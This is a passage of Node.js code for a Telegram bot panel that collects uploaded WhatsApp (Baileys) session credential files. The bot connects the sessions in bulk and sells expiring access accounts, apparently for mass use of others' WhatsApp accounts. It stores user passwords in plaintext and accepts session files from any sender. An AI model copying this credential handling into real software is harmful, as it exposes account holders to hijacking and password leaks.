    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

// ========== CONNECT SESSION YANG DIPERBAIKI ==========
async function connectSession(folderPath, sessionName, retries = 3) {
  return new Promise(async (resolve) => {
    let attempt = 0;

    const tryConnect = async () => {
      try {
        const sessionsFold = path.join(folderPath, sessionName);
        const folderName = path.basename(folderPath);
        const cacheKey = buildSessionCacheKey(folderName, sessionName);

        // Pastikan folder session ada
        ensureSessionDir(sessionsFold);

        // Cek apakah ada creds.json
        const credsPath = path.join(sessionsFold, 'creds.json');
        if (!fs.existsSync(credsPath)) {
          console.log(`[${sessionName}] Tidak ada creds.json, lewati...`);
          resolve();
          return;
        }

        const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
        const safeSaveCreds = createSafeSaveCreds(saveCreds, sessionsFold);
        const { version } = await fetchLatestBaileysVersion();

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: false,
          logger: pino({ level: "silent" }),
          version: version,
          defaultQueryTimeoutMs: undefined,
          keepAliveIntervalMs: 30000,
        });

        let connected = false;
        let timeoutId = setTimeout(() => {
          if (!connected) {
            console.log(`[${sessionName}] Timeout koneksi, attempt ${attempt + 1}/${retries}`);
            sock.ws?.close();
            if (attempt < retries - 1) {
              attempt++;
              setTimeout(tryConnect, 3000);
            } else {
              resolve();
            }
          }
        }, 30000);

        sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

          if (connection === "open") {
            clearTimeout(timeoutId);
            connected = true;
            activeConnections[cacheKey] = sock;

            const type = detectWATypeFromCreds(path.join(sessionsFold, 'creds.json'));
            console.log(`✅ [${sessionName}] Connected. Type: ${type}`);

            if (type === "Business") {
              biz[cacheKey] = sock;
            } else if (type === "Messenger") {
              mess[cacheKey] = sock;
            }

            // Simpan state setelah connect
            if (typeof saveSessionState === 'function') saveSessionState();
            resolve();
          } else if (connection === "close") {
            clearTimeout(timeoutId);

            if (deletingSessions.has(cacheKey)) {
              delete activeConnections[cacheKey];
              delete biz[cacheKey];
              delete mess[cacheKey];
              removeSessionArtifacts(folderPath, sessionName);
              deletingSessions.delete(cacheKey);
              resolve();
              return;
            }

            if (statusCode === 440) {
              delete activeConnections[cacheKey];
              delete biz[cacheKey];
              delete mess[cacheKey];
              removeSessionArtifacts(folderPath, sessionName);
              resolve();
            } else if (!isLoggedOut && attempt < retries - 1) {
              console.log(`🔄 [${sessionName}] Reconnecting... (attempt ${attempt + 2}/${retries})`);
              attempt++;
              await waiting(5000);
              tryConnect();
            } else {
              console.log(`❌ [${sessionName}] Gagal connect setelah ${retries} attempts`);
              delete activeConnections[cacheKey];
              delete biz[cacheKey];
              delete mess[cacheKey];
              resolve();
            }
          }
        });

        sock.ev.on("creds.update", async () => {
          await safeSaveCreds();
          const sourceCreds = path.join(sessionsFold, 'creds.json');
          const destCreds = path.join(folderPath, `${sessionName}.json`);
          try {
            ensureSessionDir(folderPath);
            if (fs.existsSync(sourceCreds)) {
              fs.copyFileSync(sourceCreds, destCreds);
            }
          } catch (err) {
            console.error(`❌ [${sessionName}] Gagal backup creds:`, err?.message || err);
          }
        });

      } catch (err) {
        console.log(`❌ [${sessionName}] Error: ${err.message}`);
        if (attempt < retries - 1) {
          attempt++;
          await waiting(3000);
          tryConnect();
        } else {
          resolve();
        }
      }
    };

    await tryConnect();
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}
async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);
    const cacheKey = buildSessionCacheKey(sessionFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[cacheKey]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('permenmd', owner, number);
  const cacheKey = buildSessionCacheKey(owner, number);

  ensureSessionDir(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const safeSaveCreds = createSafeSaveCreds(saveCreds, sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", safeSaveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      if (deletingSessions.has(cacheKey)) {
        delete activeConnections[cacheKey];
        delete biz[cacheKey];
        delete mess[cacheKey];
        removeSessionArtifacts(path.join('permenmd', owner), number);
        deletingSessions.delete(cacheKey);
        return;
      }

      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[cacheKey];
        delete biz[cacheKey];
        delete mess[cacheKey];
      }
    } else if (connection === "open") {
      activeConnections[cacheKey] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);
      const type = detectWATypeFromCreds(sourceCreds);

      if (type === "Business") {
        biz[cacheKey] = sock;
      } else if (type === "Messenger") {
        mess[cacheKey] = sock;
      }

      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds); // baca isi file sumber
          fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}


// ========== START USER SESSIONS YANG DIPERBAIKI ==========
async function startUserSessions() {
  const permenmdPath = path.join(__dirname, 'permenmd');

  if (!fs.existsSync(permenmdPath)) {
    console.log("📁 Folder permenmd tidak ditemukan, buat folder baru...");
    fs.mkdirSync(permenmdPath, { recursive: true });
    return;
  }

  const subfolders = fs.readdirSync(permenmdPath)
    .map(name => path.join(permenmdPath, name))
    .filter(p => fs.lstatSync(p).isDirectory());

  console.log(`📂 Ditemukan ${subfolders.length} folder di permenmd`);

  let totalSessions = 0;
  let restoredSessions = 0;

  for (const folder of subfolders) {
    const folderName = path.basename(folder);

    // Ambil semua file .json di folder
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"));

    // Ambil semua subfolder yang mungkin berisi session
    const subfoldersInFolder = fs.readdirSync(folder)
      .filter(name => {
        const fullPath = path.join(folder, name);
        return fs.lstatSync(fullPath).isDirectory();
      });

    // Gabungkan session dari file json dan subfolder
    const sessions = [...new Set([
      ...jsonFiles.map(file => path.basename(file, ".json")),
      ...subfoldersInFolder
    ])];

    console.log(`📁 Folder ${folderName}: ${sessions.length} session ditemukan`);
    totalSessions += sessions.length;

    for (const sessionName of sessions) {
      const cacheKey = buildSessionCacheKey(folderName, sessionName);

      // Skip jika sudah aktif
      if (activeConnections[cacheKey]) {
        console.log(`⏭️ [${sessionName}] Already connected, skipping...`);
        continue;
      }

      // Cek apakah ada creds.json yang valid
      const sessionFolder = path.join(folder, sessionName);
      const credsFile = path.join(sessionFolder, 'creds.json');
      const jsonFile = path.join(folder, `${sessionName}.json`);

      let hasValidCreds = false;

      if (fs.existsSync(credsFile)) {
        try {
          const creds = JSON.parse(fs.readFileSync(credsFile, 'utf8'));
          if (creds && creds.noiseKey) {
            hasValidCreds = true;
          }
        } catch (e) {
          console.log(`⚠️ [${sessionName}] Creds file corrupted`);
        }
      }

      // Jika tidak ada creds.json tapi ada file json, coba restore
      if (!hasValidCreds && fs.existsSync(jsonFile)) {
        try {
          const credsData = fs.readFileSync(jsonFile, 'utf8');
          const creds = JSON.parse(credsData);
          if (creds && creds.noiseKey) {
            if (!fs.existsSync(sessionFolder)) {
              fs.mkdirSync(sessionFolder, { recursive: true });
            }
            fs.writeFileSync(credsFile, credsData);
            hasValidCreds = true;
            console.log(`🔧 [${sessionName}] Creds restored from json file`);
          }
        } catch (e) {
          console.log(`⚠️ [${sessionName}] Cannot restore from json: ${e.message}`);
        }
      }

      if (hasValidCreds) {
        console.log(`🔌 [${sessionName}] Connecting...`);
        await connectSession(folder, sessionName);
        restoredSessions++;
        await waiting(2000);
      } else {
        console.log(`⏭️ [${sessionName}] No valid creds, skipping...`);
      }
    }
  }

  console.log(`📊 StartUserSessions selesai: ${restoredSessions}/${totalSessions} session terhubung`);
}

// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  // Ambil semua file .json di folder (tanpa subfolder)
  const files = fs.readdirSync(folderPath).filter(f => f.endsWith('.json'));
  const activeSessions = [];

  for (const file of files) {
    const sessionName = path.basename(file, '.json');
    const cacheKey = buildSessionCacheKey(subfolderName, sessionName);
    const sock = activeConnections[cacheKey];
    if (sock) {
      activeSessions.push({ sock, sessionName, cacheKey });
    }
  }

  if (activeSessions.length === 0) return null;
  return activeSessions[Math.floor(Math.random() * activeSessions.length)];
}

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(TELEGRAM_DATA_PATH)) {
    fs.writeFileSync(TELEGRAM_DATA_PATH, JSON.stringify({ ownerList: [], developerList: [], userList: [] }, null, 2));
  }
  const config = JSON.parse(fs.readFileSync(TELEGRAM_DATA_PATH));
  if (!Array.isArray(config.ownerList)) config.ownerList = [];
  if (!Array.isArray(config.userList)) config.userList = [];
  if (!Array.isArray(config.developerList)) config.developerList = [];
  return config;
}

function saveTelegramConfig(config) {
  fs.writeFileSync(TELEGRAM_DATA_PATH, JSON.stringify(config, null, 2));
}

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {   // ← pakai DB_PATH
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🆔 ${u.telegramId || '-'} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

function findUserByIdentity(db, identity) {
  const normalized = String(identity || "").trim();
  if (!normalized) return null;

  return db.find((user) => {
    const username = String(user.username || "").trim();
    const telegramId = String(user.telegramId || "").trim();
    return username === normalized || telegramId === normalized;
  }) || null;
}

function extendUserExpiry(user, addDays) {
  const parsedDays = parseInt(addDays, 10);
  if (Number.isNaN(parsedDays) || parsedDays <= 0) {
    return { ok: false, message: "❌ Jumlah hari tidak valid." };
  }

  const baseDate = new Date(user.expiredDate);
  const startDate = Number.isNaN(baseDate.getTime()) || baseDate < new Date()
    ? new Date()
    : baseDate;

  startDate.setDate(startDate.getDate() + parsedDays);
  user.expiredDate = startDate.toISOString().split("T")[0];

  return { ok: true, expiredDate: user.expiredDate };
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ===== Command Handlers =====
bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isDeveloper = config.developerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner || isDeveloper;

  if (!isUser) return bot.sendMessage(id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini. jika ingin ambil trial akun ketik /free");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Buat Akun Member", callback_data: "create_member" }],
        [{ text: "⏳ Set Expired", callback_data: "set_expire" }],
        ...((isOwner || isDeveloper) ? [[
          { text: "📋 List User", callback_data: "list_user" },
          { text: "🎛 Buat Custom User", callback_data: "create_custom" },
          { text: "🗑 Hapus User", callback_data: "delete_user" }
        ]] : []),
        ...(isOwner ? [[
          { text: "🔄 Reset Panel", callback_data: "reset_panel" }
        ]] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:`, options);
});
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.onText(/^\/?refresh/, async (msg) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.")
  await refreshUserSessions()
  await bot.sendMessage(chatId, "⚠️ Server Is Refreshing wait for 30-60 Seconds.");
})

bot.onText(/^\/?addadmin\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

  const targetId = parseInt(match[1], 10);
  if (Number.isNaN(targetId)) {
    return bot.sendMessage(chatId, "❌ Format salah. Gunakan /addadmin <telegram_id>.");
  }

  if (!config.developerList.includes(targetId)) {
    config.developerList.push(targetId);
  }
  if (!config.userList.includes(targetId)) {
    config.userList.push(targetId);
  }

  saveTelegramConfig(config);
  bot.sendMessage(chatId, `✅ Telegram ID ${targetId} berhasil ditambahkan sebagai developer.`);
})

bot.onText(/^\/(\d+)(?:\s+(\d+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const requesterId = msg.from.id;
  const config = loadTelegramConfig();
  const isAllowed = config.ownerList.includes(requesterId) || config.developerList.includes(requesterId) || config.userList.includes(requesterId);

  if (!isAllowed) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const telegramId = String(match[1] || "").trim();
  const addDays = String(match[2] || "").trim();

  if (!telegramId || !addDays) {
    return bot.sendMessage(chatId, "⚠️ Format salah.\nGunakan `/telegram_id jumlah_hari`\nContoh: `/628123456789 30`", {
      parse_mode: "Markdown"
    });
  }

  const db = loadDatabase();
  const user = findUserByIdentity(db, telegramId);
  if (!user) {
    return bot.sendMessage(chatId, `❌ User dengan Telegram ID ${telegramId} tidak ditemukan.`);
  }

  if (!config.ownerList.includes(requesterId) && user.role !== "member") {
    return bot.sendMessage(chatId, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
  }

  const result = extendUserExpiry(user, addDays);
  if (!result.ok) {
    return bot.sendMessage(chatId, result.message);
  }

  saveDatabase(db);
  return bot.sendMessage(chatId, `✅ Akses ${user.username} (${telegramId}) diperpanjang ${addDays} hari.\n⏳ Expired baru: ${user.expiredDate}`);
});

bot.onText(/^\/?globalsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "lu ngapain");
  }

  const connectedBiz = Object.keys(biz);
  const connectedMess = Object.keys(mess);
  const connectedNumbers = Object.keys(activeConnections);

  const onlineMess = connectedMess || [];
  const onlineBiz = connectedBiz || [];
  const onlineNumbers = connectedNumbers || [];

  let message = `📌 Global Session\n\n`;

  message += 'Messenger Session:\n';
  message += onlineMess.length > 0
    ? connectedMess.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nBusiness Session:\n';
  message += onlineBiz.length > 0
    ? connectedBiz.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nActive Numbers:\n';
  message += onlineNumbers.length > 0
    ? connectedNumbers.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  bot.sendMessage(chatId, message);
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isDeveloper = config.developerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner || isDeveloper;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "create_member":
      bot.sendMessage(id, `📋 *FORMAT PEMBUATAN AKUN MEMBER*

Kirimkan pesan baru dengan format berikut (pisahkan dengan karakter \`|\`):
\`telegram_id|username|password|durasi_hari\`

*Detail Parameter:*
• *telegram_id* : ID numerik Telegram user (contoh: \`1629305481\`)
• *username* : Nama pengguna untuk login aplikasi (contoh: \`budi_gkz\`)
• *password* : Kata sandi untuk login aplikasi (contoh: \`pass123\`)
• *durasi_hari* : Masa aktif akun dalam jumlah hari (contoh: \`30\`)

*Contoh Kirim:*
\`1629305481|budi_gkz|pass123|30\``, { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [telegramId, username, password, day] = msg.text.split("|").map(item => item.trim());
        const db = loadDatabase();
        if (!telegramId || !username || !password || !day) {
          return bot.sendMessage(id, `❌ *Format Salah!*

Gunakan format:
\`telegram_id|username|password|durasi_hari\`

*Contoh:*
\`1629305481|budi_gkz|pass123|30\``, { parse_mode: "Markdown" });
        }
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        if (db.find(u => String(u.telegramId || "") === telegramId)) return bot.sendMessage(id, "❌ Telegram ID sudah terdaftar!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        const expDate = expired.toISOString().split("T")[0];
        db.push({ telegramId, username, password, role: "member", expiredDate: expDate });
        saveDatabase(db);
        bot.sendMessage(id, `✅ *AKUN MEMBER BERHASIL DIBUAT*

📋 *Rincian Akun:*
• 👤 *Username:* \`${username}\`
• 🔐 *Password:* \`${password}\`
• 🆔 *Telegram ID:* \`${telegramId}\`
• 🎭 *Role:* \`member\`

⏱ *Masa Aktif:*
• 📅 *Expired:* \`${expDate}\`
• ⏳ *Durasi:* \`${day} Hari\`
• 🟢 *Status:* \`Aktif\`

💡 _Silakan login ke aplikasi menggunakan Username dan Password di atas._`, { parse_mode: "Markdown" });
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username_atau_telegram_id|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [identity, addDays] = msg.text.split("|").map(item => item.trim());
        const db = loadDatabase();
        const user = findUserByIdentity(db, identity);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        // Cegah userList mengubah role selain member
        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const result = extendUserExpiry(user, addDays);
        if (!result.ok) {
          return bot.sendMessage(id, result.message);
        }

        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${user.username} (${user.telegramId || '-'}) ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner && !isDeveloper) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*
${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner && !isDeveloper) return;
      bot.sendMessage(id, `📋 *FORMAT PEMBUATAN AKUN KUSTOM*

Kirimkan pesan baru dengan format berikut (pisahkan dengan karakter \`|\`):
\`telegram_id|username|password|role|durasi_hari\`

*Detail Parameter:*
• *telegram_id* : ID numerik Telegram user (contoh: \`1629305481\`)
• *username* : Nama pengguna untuk login aplikasi (contoh: \`budi_gkz\`)
• *password* : Kata sandi untuk login aplikasi (contoh: \`pass123\`)
• *role* : Level hak akses (Pilihan: \`owner\`, \`admin\`, \`seller\`, \`member\`)
• *durasi_hari* : Masa aktif akun dalam jumlah hari (contoh: \`30\`)

*Contoh Kirim:*
\`1629305481|budi_gkz|pass123|member|30\``, { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [telegramId, username, password, role, day] = msg.text.split("|").map(item => item.trim());
        const db = loadDatabase();
        if (!telegramId || !username || !password || !role || !day) {
          return bot.sendMessage(id, `❌ *Format Salah!*

Gunakan format:
\`telegram_id|username|password|role|durasi_hari\`

*Contoh:*
\`1629305481|budi_gkz|pass123|member|30\``, { parse_mode: "Markdown" });
        }
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        if (db.find(u => String(u.telegramId || "") === telegramId)) return bot.sendMessage(id, "❌ Telegram ID sudah terdaftar!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        const expDate = expired.toISOString().split("T")[0];
        db.push({ telegramId, username, password, role, expiredDate: expDate });
        saveDatabase(db);
        bot.sendMessage(id, `✅ *AKUN KUSTOM BERHASIL DIBUAT*

📋 *Rincian Akun:*
• 👤 *Username:* \`${username}\`
• 🔐 *Password:* \`${password}\`
• 🆔 *Telegram ID:* \`${telegramId}\`
• 🎭 *Role:* \`${role}\`

⏱ *Masa Aktif:*
• 📅 *Expired:* \`${expDate}\`
• ⏳ *Durasi:* \`${day} Hari\`
• 🟢 *Status:* \`Aktif\`

💡 _Silakan login ke aplikasi menggunakan Username dan Password di atas._`, { parse_mode: "Markdown" });
      });
      break;

    case "delete_user":
      if (!isOwner && !isDeveloper) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;

    case "reset_panel":
      if (!isOwner) return bot.answerCallbackQuery(query.id, { text: "Hanya owner." });
      bot.sendMessage(id, "⚠️ Yakin ingin *reset panel*?\nSemua koneksi WebSocket dan WhatsApp akan dihentikan dan disambungkan ulang.", {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "✅ Ya, Reset", callback_data: "confirm_resetpanel" },
              { text: "❌ Batal", callback_data: "cancel_resetpanel" }
            ]
          ]
        }
      });
      break;

    case "confirm_resetpanel":
      if (query.from.id !== OWNER_ID) return bot.answerCallbackQuery(query.id, { text: "Hanya owner." });
      bot.answerCallbackQuery(query.id, { text: "Resetting panel..." });
      bot.sendMessage(id, "🔄 Mereset panel...");
      doResetPanel();
      break;

    case "cancel_resetpanel":
      bot.answerCallbackQuery(query.id, { text: "Dibatalkan." });
      bot.sendMessage(id, "❌ Reset panel dibatalkan.");
      break;
  }
});

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}
// ─── /free — Trial System ────────────────────────────────────────────────────
const FREE_TRIAL_FILE = './free_trial_used.json';

function loadTrialUsed() {
  if (!fs.existsSync(FREE_TRIAL_FILE)) fs.writeFileSync(FREE_TRIAL_FILE, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(FREE_TRIAL_FILE));
}
function saveTrialUsed(data) {
  fs.writeFileSync(FREE_TRIAL_FILE, JSON.stringify(data, null, 2));
}

// ─── Wajib Join Channel/Grup ──────────────────────────────────────────────────
// ─── Wajib Join 3 Grup ───────────────────────────────────────────────────────
const REQUIRED_GROUPS = [
  { username: 'TRVSP_PROJECK', link: 'https://t.me/TRVSP_PROJECK' },
  { username: 'testifaz', link: 'https://t.me/testifaz' },
];

async function isMember(telegramId, chatUsername) {
  try {
    const member = await bot.getChatMember(chatUsername, telegramId);
    return ['member', 'administrator', 'creator'].includes(member.status);
  } catch (e) {
    return false;
  }
}

bot.onText(/^\/free$/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from.id;

  // Cek join semua grup
  const joinResults = await Promise.all(
    REQUIRED_GROUPS.map(g => isMember(telegramId, g.username))
  );

  const allJoined = joinResults.every(Boolean);

  if (!allJoined) {
    const statusLines = REQUIRED_GROUPS.map((g, i) =>
      `${joinResults[i] ? '✅' : '❌'} ${g.username}`
    ).join('\n');

    return bot.sendMessage(chatId,
      `🔒 *Untuk menggunakan fitur /free, kamu wajib join semua grup berikut:*\n\n${statusLines}\n\nSetelah join semua, ketik /free lagi.`,
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: REQUIRED_GROUPS.map(g => ([
            { text: `👥 Join ${g.username}`, url: g.link }
          ]))
        }
      }
    );
  }

  // Sudah join semua — cek trial
  const trialUsed = loadTrialUsed();
  const alreadyUsed = trialUsed.find(t => t.telegramId === telegramId);
  if (alreadyUsed) {
    return bot.sendMessage(chatId,
      `❌ *Kamu sudah pernah menggunakan kupon trial.*\nTrial hanya bisa digunakan *1 kali* per akun Telegram.\n\nJika ingin akses lebih, silahkan beli ke @kaichosoul`,
      { parse_mode: 'Markdown' }
    );
  }

  bot.sendMessage(chatId,
    `🎟 *Kupon Trial Anda: 1/1*\n\nAkun trial aktif selama *1 hari*.\n\n📝 Kirim data akun kamu dengan format:\n\`username,password\`\n\nContoh:\n\`kaicho,772\``,
    { parse_mode: 'Markdown' }
  );

  // Tunggu input user
  bot.once('message', async (msg) => {
    if (msg.from.id !== telegramId) return;

    const text = (msg.text || '').trim();
    const parts = text.split(',').map(s => s.trim());

    if (parts.length !== 2 || !parts[0] || !parts[1]) {
      return bot.sendMessage(chatId,
        `❌ Format salah. Gunakan:\n\`username,password\`\n\nContoh:\n\`kaicho,772\``,
        { parse_mode: 'Markdown' }
      );
    }

    const [username, password] = parts;
    const db = loadDatabase();

    if (db.find(u => u.username === username)) {
      return bot.sendMessage(chatId,
        `❌ Username *${username}* sudah dipakai. Coba username lain.`,
        { parse_mode: 'Markdown' }
      );
    }

    if (db.find(u => String(u.telegramId || '') === String(telegramId))) {
      return bot.sendMessage(chatId,
        `❌ Telegram ID kamu sudah terdaftar di akun lain.`
      );
    }

    // Buat akun trial 1 hari
    const expired = new Date();
    expired.setDate(expired.getDate() + 1);
    const expiredStr = expired.toISOString().split('T')[0];

    db.push({
      telegramId: String(telegramId),
      username,
      password,
      role: 'member',
      expiredDate: expiredStr,
      isTrial: true
    });
    saveDatabase(db);

    // Tandai trial sudah dipakai
    trialUsed.push({ telegramId, username, usedAt: new Date().toISOString() });
    saveTrialUsed(trialUsed);

    // Kirim notifikasi ke grup
    sendToGroups(
      `🎟 *Akun Trial Dibuat*\n\n👤 Username: \`${username}\`\n🆔 Telegram ID: ${telegramId}\n📅 Expired: *${expiredStr}*\n🎭 Role: member\n⏱ Durasi: 1 hari`,
      { parse_mode: 'Markdown' }
    );

    // Balas ke user
    bot.sendMessage(chatId,
